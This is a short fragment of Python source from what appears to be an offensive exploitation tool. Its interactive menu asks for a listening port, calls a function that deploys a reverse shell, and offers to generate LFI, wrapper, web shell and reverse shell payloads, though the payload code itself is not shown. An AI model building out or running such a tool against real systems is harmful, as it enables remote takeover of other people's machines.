                    lport_input = input(f"{Fore.YELLOW}Enter port [4444]: {Style.RESET_ALL}")
                    lport = int(lport_input) if lport_input else 4444
                    exploiter.deploy_reverse_shell(lhost, lport)
                elif choice == "3":
                    print(f"\n{Fore.YELLOW}What to generate? (lfi/wrappers/shells/revshell): {Style.RESET_ALL}", end='')
                    gen_type = input() or "shells"
                    exploiter.show_payloads(gen_type)
                else:
                    print(f"{Fore.YELLOW}[*] Exiting...{Style.RESET_ALL}")


if __name__ == '__main__':
    main()
